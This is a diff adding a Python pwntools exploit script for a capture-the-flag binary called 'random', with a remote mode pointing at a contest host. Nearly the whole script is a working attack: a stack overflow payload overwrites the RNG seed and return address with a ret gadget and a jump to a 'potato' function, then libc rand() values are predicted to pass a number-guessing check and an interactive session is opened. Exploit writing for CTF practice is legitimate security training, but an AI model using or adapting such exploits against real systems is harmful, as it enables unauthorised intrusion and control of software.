@@ -1,0 +1,81 @@
+#!/usr/bin/env python3
+from pwn import *
+import ctypes
+
+fname = f'random'
+ip = 'cybergon2023.webhop.me'
+port = 5003
+
+#set target binary and context
+elf = context.binary = ELF(f'./{fname}')
+
+#initialize rop function and find gadgets
+rop = ROP(elf)
+
+
+gdbscript="""
+b *main
+b *main+53
+b *main+103
+b *main+135
+b *main+402
+b *main+282
+b *main+376
+"""
+
+mode = 'debug'
+
+if mode == 'attach':
+    r = process(f'{fname}',aslr=False)
+    attach(f'{fname}',gdbscript=gdbscript)
+elif mode == 'debug':
+    r = gdb.debug(f'./{fname}',aslr=False,gdbscript=gdbscript)
+elif mode == 'remote':
+    r = remote(ip,port)
+else :
+    r = process(f'{fname}',aslr=False)
+
+rb = lambda x :r.recvb(x)
+rl = lambda : r.recvline()
+ru = lambda x :r.recvuntil(x)
+rc = lambda x :r.recvline_contains(x)
+s = lambda x :r.send(x)
+sl = lambda x : r.sendline(x)
+sla = lambda x,y : r.sendlineafter(x,y)
+inter = lambda : r.interactive()
+
+# this will import the libc rand() function that we can use it in ur python script
+
+libc = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')
+
+def rc4(randNumber,seed):
+    tmp = (seed + randNumber >> 0x1f) >> 0x18
+    return (seed + randNumber + tmp & 0xff) - tmp
+
+def pwn():
+    seed = 0x1337
+    libc.srand(seed)
+
+
+    payload = b''
+    payload += b'A'*112
+    payload += p64(seed)                        #set thee seed 
+    payload += p64(0x1122334455667788)*2
+    payload += p64(rop.find_gadget(['ret'])[0])          #return to fix Stack alignment
+    payload += p64(elf.symbols['potato'])          #jump to the potato()
+
+
+    sl(payload)
+
+    rc('Guess my numbers!')
+    sleep(1)
+
+    for i in range(10):
+        numb = rc4(libc.rand(),seed)
+        sl(f'{numb}')
+
+    inter()
+
+
+if __name__ == '__main__':
+    pwn()
